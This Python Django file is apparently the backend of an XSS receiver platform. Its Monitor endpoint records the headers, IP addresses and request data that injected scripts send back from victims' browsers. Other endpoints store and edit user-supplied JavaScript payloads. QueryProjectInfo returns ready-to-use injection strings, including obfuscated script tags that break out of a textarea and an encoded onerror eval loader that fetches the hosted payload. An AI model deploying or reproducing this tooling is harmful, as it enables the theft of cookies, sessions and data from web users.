from Web.WebClassCongregation import UserInfo,CrossSiteScriptInfo,CrossSiteScriptProject
from django.http import JsonResponse,HttpResponse
from ClassCongregation import ErrorLog,GetJavaScriptFilePath,randoms
import json
import base64
import re
from config import cross_site_script_uses_domain_names
from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord

def GetIp(request):
    '''获取请求者的IP信息'''
    XForwardedFor = request.META.get('HTTP_X_FORWARDED_FOR')  # 判断是否使用代理
    if XForwardedFor:
        Ip = XForwardedFor.split(',')[0]  # 使用代理获取真实的ip
    else:
        Ip = request.META.get('REMOTE_ADDR')  # 未使用代理获取IP
    return Ip

def Monitor(request,data):#用于接收信息的监控
    RequestLogRecord(request, request_api="xss")
    GetRequestFragment=""
    try:#正则匹配获取项XSS目生成文件名
        GetRequestFragment = re.search(r'/[a-zA-Z0-9]{5}', str(request.get_full_path), re.I).group(0)  # 对URL进行提取处理
        #print(GetRequestFragment[1:6])
    except Exception as e:
        ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_Monitor(def)-GetRequestFragment", e)

    if request.method == "POST":
        try:

            if request.headers["Content-Type"]=="application/json":
                DataPackInfo = request.body#获取post数据包信息
            else:
                DataPackInfo = str(request.POST.dict()).encode('utf-8')#转换成字典后再换装byte类型穿给加密函数
            HeadersInfo = str(request.headers).encode('utf-8')#获取头信息
            CrossSiteScriptInfo().Write(headers=base64.b64encode(HeadersInfo),  #对信息进行编码
                                        ip=GetIp(request),  #获取IP信息
                                        full_url=str(request.build_absolute_uri()),  # 获取完整URL
                                        request_method="POST",
                                        project_associated_file_name=GetRequestFragment[1:6],#获取请求的文件，并且删除字符串/符号
                                        data_pack=base64.b64encode(DataPackInfo))#写入信息到数据库
        except Exception as e:
            ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_Monitor(def)-POST", e)
    elif request.method == "GET":
        try:
            ParameterInfo=str(request.GET.dict()).encode('utf-8')#获取参数信息
            HeadersInfo=str(request.headers).encode('utf-8')#获取头信息
            CrossSiteScriptInfo().Write(headers=base64.b64encode(HeadersInfo),  # 对信息进行编码
                                        full_url=str(request.build_absolute_uri()),#获取完整URL
                                        ip=GetIp(request),  # 获取IP信息
                                        request_method="GET",
                                        project_associated_file_name=GetRequestFragment[1:6],
                                        data_pack=base64.b64encode(ParameterInfo))  # 写入信息到数据库

        except Exception as e:
            ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_Monitor(def)-GET", e)

    return HttpResponse("")


"""create_cross_site_script_project
{
	"token": "",
	"project_name":"project_name",
	"javascript_data":""
}
"""
def GenerateProject(request):#用来生成项目，并且生成文件和用户绑定
    RequestLogRecord(request, request_api="create_cross_site_script_project")
    if request.method == "POST":
        try:
            JavaScriptFileData = json.loads(request.body)["javascript_data"]#获取前端传入的加密过的js文件数据
            ProjectName = json.loads(request.body)["project_name"]#用户自定义的项目名
            UserToken = json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(UserToken)  # 如果登录成功后就来查询用户名
            if Uid != None and JavaScriptFileData!=None:  # 查到了UID,并且js数据不为空
                UserOperationLogRecord(request, request_api="create_cross_site_script_project", uid=Uid)
                GetJavaScriptFilePath().Result()#获取js文件路径
                while True:#如果查询确实冲突了
                    JavaScriptSaveFileName=randoms().result(5)#文件名
                    QueryJavaScriptSaveFileNameValidity = CrossSiteScriptProject().RepeatInvestigation(file_name=JavaScriptSaveFileName)#判断文件是否重复
                    if not QueryJavaScriptSaveFileNameValidity:#如果不冲突的话跳出循环
                        break
                JavaScriptSaveRoute = GetJavaScriptFilePath().Result() + JavaScriptSaveFileName  # 获得保存路径
                with open(JavaScriptSaveRoute, 'w+',encoding='UTF-8') as f:
                    f.write(base64.b64decode(str(JavaScriptFileData).encode('utf-8')).decode('utf-8'))#文件内容还要加密
                CrossSiteScriptProject().Write(file_name=JavaScriptSaveFileName,uid=Uid,project_name=ProjectName)#写到数据库表中
                return JsonResponse({'message': JavaScriptSaveFileName, 'code': 200, })#返回创建好的文件名
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_GenerateProject(def)", e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""query_cross_site_script_project
{
	"token": "",
}
"""
def QueryProject(request):#用来查看用户的XSS项目
    RequestLogRecord(request, request_api="query_cross_site_script_project")
    if request.method == "POST":
        try:
            UserToken = json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(UserToken)  # 如果登录成功后就来查询用户名
            if Uid != None :  # 查到了UID
                UserOperationLogRecord(request, request_api="query_cross_site_script_project", uid=Uid)
                CrossSiteScriptProjectResult = CrossSiteScriptProject().Query(uid=Uid)  # 查询项目信息
                return JsonResponse({'message': CrossSiteScriptProjectResult, 'code': 200, })

            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_QueryProject(def)", e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""query_cross_site_script_project
{
	"token": "",
	"project_associated_file_name":""
}
"""
def QueryProjectData(request):  # 用来查看用户的XSS项目中接收的数据
    RequestLogRecord(request, request_api="query_cross_site_script_project_data")
    if request.method == "POST":
        try:
            ProjectAssociatedFileName = json.loads(request.body)["project_associated_file_name"]#传入项目生成的文件名
            UserToken = json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(UserToken)  # 如果登录成功后就来查询用户名
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="query_cross_site_script_project_data", uid=Uid)
                AuthorityCheck = CrossSiteScriptProject().AuthorityCheck(uid=Uid,file_name=ProjectAssociatedFileName)  # 用来校检CrossSiteScript数据库中文件名和UID相对应

                if AuthorityCheck:
                    CrossSiteScriptInfoResult=CrossSiteScriptInfo().Query(project_associated_file_name=ProjectAssociatedFileName)#查询数据库中项目的XSS信息
                    return JsonResponse({'message': CrossSiteScriptInfoResult, 'code': 200, })
                else:
                    return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_QueryProjectData(def)", e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""modify_cross_site_script_project
{
	"token": "",
	"project_associated_file_name":"",
	"project_associated_file_data":""
}
"""
def ModifyProject(request):  # 用来修改XSS项目中的数据
    RequestLogRecord(request, request_api="modify_cross_site_script_project")
    if request.method == "POST":
        try:
            ProjectAssociatedFileName = json.loads(request.body)["project_associated_file_name"]#传入项目生成的文件名
            ProjectAssociatedFileData = json.loads(request.body)["project_associated_file_data"]#传入base64加密后的数据
            UserToken = json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(UserToken)  # 如果登录成功后就来查询用户名
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="modify_cross_site_script_project", uid=Uid)
                AuthorityCheck = CrossSiteScriptProject().AuthorityCheck(uid=Uid,file_name=ProjectAssociatedFileName)  # 用来校检CrossSiteScript数据库中文件名和UID相对应

                if AuthorityCheck:#判断文件是属于该用户,如果属于的话就对文件进行修改
                    JavaScriptFilePath=GetJavaScriptFilePath().Result() + ProjectAssociatedFileName#获取文件位置
                    with open(JavaScriptFilePath, 'w+',encoding='UTF-8') as f:
                        f.write(base64.b64decode(str(ProjectAssociatedFileData).encode('utf-8')).decode('utf-8'))  # 文件内容还要解密
                    return JsonResponse({'message': "文件内容覆盖成功~", 'code': 200, })
                else:
                    return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_ModifyProject(def)", e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""query_cross_site_script_project_info
{
	"token": "",
	"project_associated_file_name":""
}
"""
def QueryProjectInfo(request):  # 查询项目中详细信息
    RequestLogRecord(request, request_api="query_cross_site_script_project_info")
    if request.method == "POST":
        try:
            ProjectAssociatedFileName = json.loads(request.body)["project_associated_file_name"]#传入项目生成的文件名
            UserToken = json.loads(request.body)["token"]
            Uid = UserInfo().QueryUidWithToken(UserToken)  # 如果登录成功后就来查询用户名
            if Uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="query_cross_site_script_project_info", uid=Uid)
                AuthorityCheck = CrossSiteScriptProject().AuthorityCheck(uid=Uid,file_name=ProjectAssociatedFileName)  # 用来校检CrossSiteScript数据库中文件名和UID相对应
                if AuthorityCheck:#判断文件是属于该用户,如果属于的话就对文件进行修改
                    JavaScriptFilePath=GetJavaScriptFilePath().Result() + ProjectAssociatedFileName#获取文件位置
                    ReadFileData=open(JavaScriptFilePath, 'r',encoding='UTF-8').read()#读取文件内容
                    return JsonResponse({'message': {"project_associated_file_data":base64.b64encode(str(ReadFileData).encode('utf-8')).decode('utf-8'),
                                                     "the_first_use":"""</tExtArEa>'"><sCRiPt sRC=//"""+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName+"></sCrIpT>",
                                                     "the_second_use":"<sCRiPt/SrC=//"+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName+">",
                                                     "the_third_use":"<img sRC=//"+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName+">",
                                                     "exploit_path":"//"+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName,
                                                     "coding_exploit":"""</tEXtArEa>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22%2F%2F"""+cross_site_script_uses_domain_names+"%2Fs%2F"+ProjectAssociatedFileName+"%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>"}, 'code': 200, })
                else:
                    return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write("Web_CrossSiteScriptHub_CrossSiteScript_QueryProjectInfo(def)", e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })
